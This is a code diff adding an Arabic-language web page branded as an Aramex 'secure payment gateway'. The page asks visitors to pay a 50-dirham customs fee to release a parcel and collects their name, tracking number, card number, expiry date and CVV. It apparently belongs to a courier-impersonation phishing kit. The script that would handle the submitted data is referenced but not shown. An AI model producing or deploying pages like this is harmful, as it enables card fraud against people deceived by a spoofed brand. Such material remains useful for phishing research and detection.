@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة الدفع الآمنة - أرامكس</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js" defer></script>
+</head>
+<body>
+    <div class="container">
+        <img src="images/aramex-logo.png" alt="Aramex Logo">
+        <h1>دفع الرسوم الجمركية</h1>
+        <p>يرجى دفع 50 درهم لتأكيد شحن الطرد الخاص بك.</p>
+        <form id="payment-form">
+            <label for="name">الاسم الكامل:</label>
+            <input type="text" id="name" name="name" required>
+            <label for="tracking">رقم التتبع:</label>
+            <input type="text" id="tracking" name="tracking" required>
+            <label for="card_number">رقم البطاقة:</label>
+            <input type="text" id="card_number" name="card_number" required>
+            <label for="expiry_date">تاريخ انتهاء الصلاحية:</label>
+            <input type="text" id="expiry_date" name="expiry_date" required>
+            <label for="cvv">رمز الأمان:</label>
+            <input type="text" id="cvv" name="cvv" required>
+            <button type="submit">ادفع الآن</button>
+        </form>
+    </div>
+</body>
+</html>
